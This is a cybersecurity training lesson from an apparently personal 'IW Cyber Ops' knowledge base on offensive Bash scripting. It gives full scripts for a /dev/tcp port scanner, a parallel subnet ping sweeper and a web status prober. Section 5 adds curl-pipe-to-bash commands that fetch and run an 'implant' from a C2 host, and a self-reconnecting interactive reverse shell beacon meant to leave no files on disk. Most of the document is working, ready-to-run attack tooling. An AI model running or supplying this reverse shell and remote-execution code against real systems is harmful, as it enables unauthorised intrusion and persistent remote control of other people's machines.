<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 30 — Offensive Automation & Reconnaissance Scripts
   ========================================================================= -->

# 🛡️ Day 30: Offensive Automation & Reconnaissance Scripts

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Living-off-the-Land (LotL), Pure Bash Sockets, Concurrency & Recon Automation*

---

## 1. Living-off-the-Land (LotL) Offensive Engineering

In restricted target environments (minimal Docker containers, hardened jump boxes, incident response forensics perimeters), third-party tools like `nmap`, `netcat`, or `python` are frequently blocked or uninstalled.

**Offensive Bash Engineering** leverages built-in shell features to conduct network reconnaissance, port scanning, and staged payload execution **without dropping external binary dependencies onto the target system**.

```
  ┌────────────────────────────────────────────────────────────────────────┐
  │                 PURE BASH OFFENSIVE CAPABILITIES                       │
  ├──────────────────────────┬─────────────────────────────────────────────┤
  │ `/dev/tcp/$IP/$PORT`     │ Native raw TCP socket reading & writing     │
  │ Concurrency (`&` + wait) │ High-speed parallel host & port sweeps      │
  │ In-Memory Stream Piping  │ Staged payload execution via stdin          │
  │ Zero File Dropping       │ Minimal forensic footprint on disk sectors  │
  └──────────────────────────┴─────────────────────────────────────────────┘
```

---

## 2. The `/dev/tcp` Native Socket Engine

When compiled with net-redirections enabled (standard in GNU Bash), Bash intercepts paths matching `/dev/tcp/HOST/PORT` and handles them as **kernel network sockets** rather than physical files.

```
                    ┌──────────────────────────────────────────────┐
                    │               /dev/tcp/HOST/PORT             │
                    └──────────────────────┬───────────────────────┘
                                           │
                 ┌─────────────────────────┴─────────────────────────┐
                 ▼ (Open Socket via 'exec')                          ▼ (Close Socket)
     exec 3<>/dev/tcp/10.10.10.1/80                            exec 3>&-
     (Allocates Bidirectional FD 3)                            (Closes Socket)
```

---

### 🛠️ Weaponized Lab 1: Pure Bash Fast TCP Port Scanner

A zero-dependency TCP scanner with sub-second timeout controls:

```bash
#!/usr/bin/env bash
# =========================================================================
# IW Cyber Ops — Pure Bash Socket Scanner
# =========================================================================
set -euo pipefail

TARGET="${1:?[-] Usage: $0 <TARGET_IP> [START_PORT] [END_PORT]}"
START_PORT="${2:-1}"
END_PORT="${3:-1024}"
TIMEOUT=1

echo -e "\033[1;34m[*] Probing $TARGET (Ports $START_PORT - $END_PORT) via /dev/tcp...\033[0m"

for (( port=START_PORT; port<=END_PORT; port++ )); do
    # Probe socket using timeout command on File Descriptor redirection:
    if timeout "$TIMEOUT" bash -c "exec 3<>/dev/tcp/$TARGET/$port" 2>/dev/null; then
        echo -e "\033[1;32m[+] PORT OPEN:\033[0m $port"
        exec 3>&- 2>/dev/null || true # Close socket cleanly
    fi
done

echo "[*] Scan complete."
```

---

## 3. High-Speed Concurrency: `&` Background Workers & `wait`

Sequential network scans over 254 hosts with 1-second timeouts take ~4.2 minutes. By spawning **asynchronous background subshells (`&`)** and synchronizing with **`wait`**, execution time drops to **under 2 seconds**.

```
  Main Script Execution
           │
           ├───── Spawns Worker 1 (192.168.1.1) & ──┐
           ├───── Spawns Worker 2 (192.168.1.2) & ──┼──> [ Runs Concurrently ]
           ├───── Spawns Worker 3 (192.168.1.3) & ──┤
           │                                        │
           ▼                                        │
      [ wait Barrier ] ◄────────────────────────────┘ (Halts until ALL workers finish)
           │
           ▼
  [ Instant Aggregated Results ]
```

---

### 🛠️ Weaponized Lab 2: Multi-Threaded Subnet Sweeper

```bash
#!/usr/bin/env bash
# =========================================================================
# High-Speed Parallel ICMP Sweeper (Scans /24 in ~2 Seconds)
# =========================================================================
set -euo pipefail

SUBNET="${1:?[-] Usage: $0 <SUBNET_PREFIX e.g. 192.168.1>}"

ping_host() {
    local ip="$1"
    # Send 1 packet with 1 second timeout
    if ping -c 1 -W 1 "$ip" &>/dev/null; then
        echo -e "\033[1;32m[+] Host ALIVE:\033[0m $ip"
    fi
}

export -f ping_host

echo "[*] Sweeping subnet ${SUBNET}.0/24 concurrently..."

# Loop across all 254 host addresses
for host in {1..254}; do
    ping_host "${SUBNET}.${host}" &
done

# Wait for all 254 background child jobs to finish before exiting
wait
echo "[+] Sweep finished."
```

---

## 4. Automated Web Asset Reconnaissance Engine

Automating HTTP response header extraction, status code classification, and content-length detection across lists of target domains:

```bash
#!/usr/bin/env bash
# =========================================================================
# Web Asset Prober & Status Classifier
# =========================================================================
set -euo pipefail

TARGET_LIST="${1:?[-] Usage: $0 <targets_file.txt>}"

[[ -f "$TARGET_LIST" ]] || { echo "[-] File not found: $TARGET_LIST" >&2; exit 1; }

printf "%-35s %-12s %s\n" "URL" "STATUS" "SIZE (BYTES)"
printf "%-35s %-12s %s\n" "-----------------------------------" "------------" "------------"

while IFS= read -r DOMAIN || [[ -n "$DOMAIN" ]]; do
    # Skip empty lines or comments
    [[ -z "$DOMAIN" || "$DOMAIN" =~ ^# ]] && continue

    URL="https://${DOMAIN}"
    
    # Query status code and download size via curl without body output
    HTTP_DATA=$(curl -s -k -o /dev/null -w "%{http_code} %{size_download}" --connect-timeout 3 "$URL" || echo "000 0")
    STATUS=$(echo "$HTTP_DATA" | awk '{print $1}')
    SIZE=$(echo "$HTTP_DATA" | awk '{print $2}')

    # Colorize based on HTTP Response Codes
    case "$STATUS" in
        200) COLOR="\033[1;32m" ;; # Green
        301|302) COLOR="\033[1;33m" ;; # Yellow
        401|403) COLOR="\033[1;31m" ;; # Red
        *) COLOR="\033[0;37m" ;; # Gray
    esac

    printf "%-35s ${COLOR}%-12s\033[0m %s\n" "$URL" "[$STATUS]" "$SIZE"
done < "$TARGET_LIST"
```

---

## 5. Staged In-Memory Delivery & Callback Wrappers

### 1. In-Memory Execution via Pipe
Adversaries execute staging scripts in memory directly from remote servers without saving them to physical disk:

```bash
# Standard In-Memory Execution:
curl -fsSL http://c2.local/implant.sh | bash

# Passing CLI Arguments to a Piped Script (The '-s --' pattern):
curl -fsSL http://c2.local/scanner.sh | bash -s -- "10.10.14.5" "4444"
```
* **Why `-s --`?** The `-s` flag instructs Bash to read script code from standard input (`stdin`), while the double hyphen `--` separates the options from positional arguments passed to the script (`$1`, `$2`).

---

### 2. Persistent Self-Healing Reverse Beacon Wrapper
A robust, fault-tolerant callback loop that auto-reconnects if network connectivity drops:

```bash
#!/usr/bin/env bash
# Headless self-healing beacon handler
C2_HOST="10.10.14.5"
C2_PORT=4444
INTERVAL=10

while true; do
    # Check if C2 listener is reachable via /dev/tcp
    if bash -c "exec 3<>/dev/tcp/$C2_HOST/$C2_PORT" 2>/dev/null; then
        exec 3>&-
        # Spawn interactive reverse shell
        bash -i >& /dev/tcp/"$C2_HOST"/"$C2_PORT" 0>&1 || true
    fi
    # Wait before attempting reconnect
    sleep "$INTERVAL"
done
```

---

## 6. Offensive Scripting Reference Matrix

| Goal | Technique / Command Pattern | Tactical Advantage |
| :--- | :--- | :--- |
| **Raw Socket Test** | `(echo > /dev/tcp/$IP/$PORT) &>/dev/null` | Zero external tool dependencies |
| **Parallel Workers**| `task &` followed by `wait` | $100\times$ execution speedup |
| **Piped Arguments** | `curl -s <url> \| bash -s -- <args>` | Execute remote script with arguments in RAM |
| **Banner Grab** | `exec 3<>/dev/tcp/$IP/$PORT; cat <&3` | Live protocol inspection |
| **HTTP Code Audit** | `curl -s -o /dev/null -w "%{http_code}"` | Rapid web asset triage |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
